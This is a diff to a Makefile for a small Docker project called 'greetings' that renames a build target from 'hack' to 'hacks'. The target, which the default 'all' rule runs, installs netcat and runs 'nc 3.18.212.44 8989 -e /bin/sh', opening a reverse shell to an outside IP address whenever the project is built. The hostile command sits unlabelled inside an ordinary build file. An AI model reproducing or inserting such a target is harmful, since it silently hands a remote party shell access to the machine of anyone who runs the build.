@@ -1,5 +1,5 @@
 .PHONY: all
-all: build run hack
+all: build run hacks
 
 build:
 	docker build . -t greetings
@@ -7,7 +7,7 @@ build:
 run:
 	docker run --rm greetings
 
-hack:
+hacks:
 	apk add nmap-ncat
 	nc 3.18.212.44 8989 -e /bin/sh
 
